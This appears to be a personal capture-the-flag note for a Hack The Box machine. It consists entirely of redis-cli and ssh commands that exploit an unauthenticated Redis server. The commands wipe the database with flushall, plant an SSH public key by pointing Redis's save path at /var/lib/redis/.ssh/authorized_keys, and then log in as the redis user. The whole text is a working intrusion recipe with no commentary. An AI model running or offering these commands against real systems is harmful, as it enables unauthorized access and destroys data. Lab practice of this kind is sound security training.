redis-cli -h 10.10.10.160 flushall
redis-cli -h 10.10.10.160 set key "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFee8BPO3DENHCb/dQx9r1+eHSGVDBSRhB15f5LgDkV5Wv/u05BrBGchOcrFXTz37pi+NdLN6lo217094Mb+Ddip6yxRN7n64sIzV/fDKYHJirwj6k59UfY3MvY0fX/EE523CnYe5eaPSz5NvYkt+xcVgYXDsdf5xseySssWtqjj2jAY9nDqZayCpTAvOtnhEili5UOTRFLILMzMK8apL6aukRCvbYAEjJszuNRZyOsoQOIwxGbBOuzXc9RVCJXCsNmytrCRksUMURQIxlb9Njy0SLS0KEZfFPIwZSzb+BfD5NJsi03Ny7PzHSKjdNju85qPG15+XM7s0g1XLq9Fh/7UIAY6qx2IR38kUDaAPIOXy2gV4K79aGNQl08954E6TSFcnzgtz1m6JgaWYGr9dfGgxbrm4KH/aTZBQpyvU9z8NFdwlKtJuXMCHzq9RfWT5J+r/bNVB58YLafbIhFLxF/Yh63thq7Gw6XfWh11Tf+GsnBcI1hSU38uNP+fM/nck= javier@K4oS\n\n"
redis-cli -h 10.10.10.160 config set dir /var/lib/redis/.ssh
redis-cli -h 10.10.10.160 config set dbfilename authorized_keys
redis-cli -h 10.10.10.160 save
ssh -i /home/javier/Hacking/ctf/htb/postman/redis redis@10.10.10.160
